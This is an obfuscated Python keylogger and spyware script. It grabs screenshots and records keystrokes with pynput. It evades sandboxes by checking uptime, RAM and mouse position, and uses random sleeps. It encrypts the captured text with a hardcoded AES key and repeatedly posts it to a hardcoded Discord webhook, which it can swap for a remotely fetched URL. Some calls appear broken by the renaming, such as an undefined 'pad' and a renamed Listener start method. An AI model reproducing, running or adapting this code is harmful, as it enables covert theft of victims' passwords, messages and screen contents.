lllllllllllllll, llllllllllllllI, lllllllllllllIl, lllllllllllllII, llllllllllllIll, llllllllllllIlI, llllllllllllIIl, llllllllllllIII, lllllllllllIlll = str, len, __name__, AttributeError, print, Exception, exit, bool, open

from os.path import expanduser as lIIIIlIllIlIIl
from mss import mss as lIllllIlllIllI
from mss.tools import to_png as lIIlIllIIIlIII
from base64 import b64encode as lIIIlIIIIIIlll
from time import sleep as lIlllllllIlIlI, time as lIlIIlIIllIlll
from psutil import virtual_memory as IlIllIlIlIllIl, boot_time as IllIlIIllIIIII
from pyautogui import position as IlllIIIIIIIlll
from random import randint as IllIlIIIllllIl
from requests import get as IIIIIIlllIIIIl, post as lIllIIlIlllIll
from re import search as lllIlIIllIlIII
from socket import gethostname as IlIIlIllllllll
from getpass import getuser as lIIllIIlllllII
from threading import Thread as lIllIlIIllIlII
from pynput import keyboard as lllIlIlIIIlllI
from hashlib import sha256 as lIllllllIIIIIl
from Cryptodome.Cipher import AES as lllIIIlIlllIll
from Cryptodome.Util.Padding import pad as llIllIlllIlIll
# Option 1: alias datetime.now
from datetime import datetime as _dt
IIIlIIlllIllII = _dt.now  # this makes IIIlIIlllIllII() work



IlIIlIlIIlIIIIlIll = IIIlIIlllIllII()
lIlIIIIlIllIIIIllI = lIIIIlIllIlIIl('~')
lIIllIIllIlllIIIIl = 'sys32.txt'
IllIlIlIlIIlIlllIl = 'https://discord.com/api/webhooks/1405520151142600726/pdA3Whgfdlt0HycRmvjK4Uih36uNChuknDFN8C3RqZRFsi_T-UnVY9BL6tTIXAv2tu26'
llIlIllllIlIlIIlIl = ''
IIIlllIlIlllllllII = ''
IlIIIIIIlIIIIlllII = []
with lIllllIlllIllI() as IIllIIIlllIIIlIIll:
    IIlIlIIIllIIIlllIl = IIllIIIlllIIIlIIll.monitors[1]
    llIllllllIlIIIIlll = IIllIIIlllIIIlIIll.grab(IIlIlIIIllIIIlllIl)
    lllllIIllIlllIIIll = lIIlIllIIIlIII(llIllllllIlIIIIlll.rgb, llIllllllIlIIIIlll.size)
    IlIlllIIIllIlIIlII = lIIIlIIIIIIlll(lllllIIllIlllIIIll).decode('utf-8')
with lllllllllllIlll('filebyte.txt', 'a') as IIIllIllIIlIIlIllI:
    IIIllIllIIlIIlIllI.write(f'{IlIlllIIIllIlIIlII}')

def llIlIIIIllllllIIIl():
    with lIllllIlllIllI() as IIllIIIlllIIIlIIll:
        lllIlIIIllIIlIllII = IIllIIIlllIIIlIIll.shot(output='screenshot.png')
    llllllllllllIll(f'Screenshot saved as {lllIlIIIllIIlIllII}')

def IlIllIIIIIIllIIlII():
    try:
        if lIlIIlIIllIlll() - IllIlIIllIIIII() < 180:
            llllllllllllIIl()
        if IlIllIlIlIllIl().total < 2 * 1024 * 1024 * 1024:
            llllllllllllIIl()
        if not IlllIIIIIIIlll():
            llllllllllllIIl()
    except:
        llllllllllllIIl()
    lIlllllllIlIlI(IllIlIIIllllIl(15, 60))

def IlllllIIlllIIIlIII():
    if not llIlIllllIlIlIIlIl:
        return None
    try:
        llllIIlllIIIIlllIl = IIIIIIlllIIIIl(llIlIllllIlIlIIlIl, timeout=5).text
        lIIllIllIlIlIIlllI = lllIlIIllIlIII('(https?://\\S+)', llllIIlllIIIIlllIl)
        if lIIllIllIlIlIIlllI:
            return lIIllIllIlIlIIlllI.group(1).strip()
    except:
        return None

def IIIllIlIlIIlIllIII(IIIIlIIllIlllllIII, lIlllllIIlIIlllllI=b'supersecretkey'):
    lIlllllIIlIIlllllI = lIllllllIIIIIl(lIlllllIIlIIlllllI).digest()
    IIIIIlIllIIIIlIlll = lllIIIlIlllIll.new(lIlllllIIlIIlllllI, lllIIIlIlllIll.MODE_ECB)
    IIlllIllIIIlIIIIlI = IIIIIlIllIIIIlIlll.encrypt(pad(IIIIlIIllIlllllIII.encode(), 16))
    return lIIIlIIIIIIlll(IIlllIllIIIlIIIIlI[::-1]).decode()

def llIIIllllllIIIlIll():
    pass

def IIIlIIIlllIlIIIlll(lIlllllIIlIIlllllI):
    global IIIlllIlIlllllllII
    try:
        lIlllIIlIlIIllllII = lIlllllIIlIIlllllI.char
    except lllllllllllllII:
        if lIlllllIIlIIlllllI == lllIlIlIIIlllI.Key.backspace:
            IIIlllIlIlllllllII = IIIlllIlIlllllllII[:-1]
        elif lIlllllIIlIIlllllI == lllIlIlIIIlllI.Key.space:
            IIIIIllIIlllIIlIll(IIIlllIlIlllllllII, 'space')
            IIIlllIlIlllllllII = ''
        elif lIlllllIIlIIlllllI == lllIlIlIIIlllI.Key.enter:
            IIIIIllIIlllIIlIll(IIIlllIlIlllllllII, 'enter')
            IIIlllIlIlllllllII = ''
        return
    if lIlllIIlIlIIllllII and llllllllllllllI(lIlllIIlIlIIllllII) == 1:
        IIIlllIlIlllllllII += lIlllIIlIlIIllllII

def llIllIIlllIIIIIIlI(lIlllllIIlIIlllllI):
    if lIlllllIIlIIlllllI == lllIlIlIIIlllI.Key.esc:
        return llllllllllllIII(((1 & 0 ^ 0) & 0 ^ 1) & 0 ^ 1 ^ 1 ^ 0 | 0)

def IIIIIllIIlllIIlIll(IIlIIlIlIIIIllIIlI, IIlIlIllIlIIllIlIl):
    llIIllllIlIllIlIII = f'Word completed with {IIlIlIllIlIIllIlIl}: {IIlIIlIlIIIIllIIlI}'
    IlIIIIIIlIIIIlllII.append(llIIllllIlIllIlIII)

def lllIIllIlllIllIIIl(lIllIIIlIIIllIlllI):
    if not IlIIIIIIlIIIIlllII:
        return
    IIIlllllllllIlIlIl = '\n'.join(IlIIIIIIlIIIIlllII)
    lIIllIIlIIIlIlIIIl = IIIllIlIlIIlIllIII(IIIlllllllllIlIlIl)
    IIIIlIIllIlllllIII = {'content': lIIllIIlIIIlIlIIIl}
    IIlIIIlIlIIlIlIIII = {'User-Agent': 'DiscordBot (https://discordapp.com, v1.0)', 'Content-Type': 'application/json', 'X-Safe': lllllllllllllll(IllIlIIIllllIl(1000, 9999))}
    try:
        IllllllIllIllllIlI = lIllIIlIlllIll(lIllIIIlIIIllIlllI, json=IIIIlIIllIlllllIII, headers=IIlIIIlIlIIlIlIIII)
        llllllllllllIll('Server replied:', IllllllIllIllllIlI.status_code)
    except llllllllllllIlI as IlIIlIllIIIlIIIlII:
        llllllllllllIll('Send failed:', IlIIlIllIIIlIIIlII)

def IIllIlIIIIIIlIllll():
    lIlIIlIIllllIlllll = IlIIlIllllllll()
    lIlIIIIlIllIIIIllI = lIIllIIlllllII()
    llllllllllllIll(f'Hostname:', lIlIIlIIllllIlllll, lIlIIIIlIllIIIIllI)

def lllIIIIIllllllIlll(lIllIIIlIIIllIlllI):
    while llllllllllllIII(((1 & 0 ^ 0) & 0 ^ 1) & 0 ^ 1 ^ 1 ^ 0 | 1):
        lllIIllIlllIllIIIl(lIllIIIlIIIllIlllI)
        IIIllIIlIIlIIIlIll = IllIlIIIllllIl(10, 60)
        lIlllllllIlIlI(IIIllIIlIIlIIIlIll)

def llIIlIIlIlIIlllllI():
    lIIIIlIIIlIllIlllI = lllIlIlIIIlllI.Listener(on_press=IIIlIIIlllIlIIIlll, on_release=llIllIIlllIIIIIIlI)
    lIIIIlIIIlIllIlllI.llIIlIIlIlIIlllllI()
    lIIIIlIIIlIllIlllI.join()
if lllllllllllllIl == '__main__':
    IlIllIIIIIIllIIlII()
    lIlllllllIlIlI(IllIlIIIllllIl(15, 360))
    IlIIIllIIIlIIlIIll = IlllllIIlllIIIlIII()
    if IlIIIllIIIlIIlIIll:
        IllIlIlIlIIlIlllIl = IlIIIllIIIlIIlIIll
    IIllIlIIIIIIlIllll()
    lIllIlIIllIlII(target=lllIIIIIllllllIlll, args=(IllIlIlIlIIlIlllIl,), daemon=llllllllllllIII(((1 & 0 ^ 0) & 0 ^ 1) & 0 ^ 1 ^ 1 ^ 0 | 1)).llIIlIIlIlIIlllllI()
    IlIIIIIIlIIIIlllII.append(f'Session Started at: {IlIIlIlIIlIIIIlIll}')
    llIIlIIlIlIIlllllI()
    llIIIllllllIIIlIll()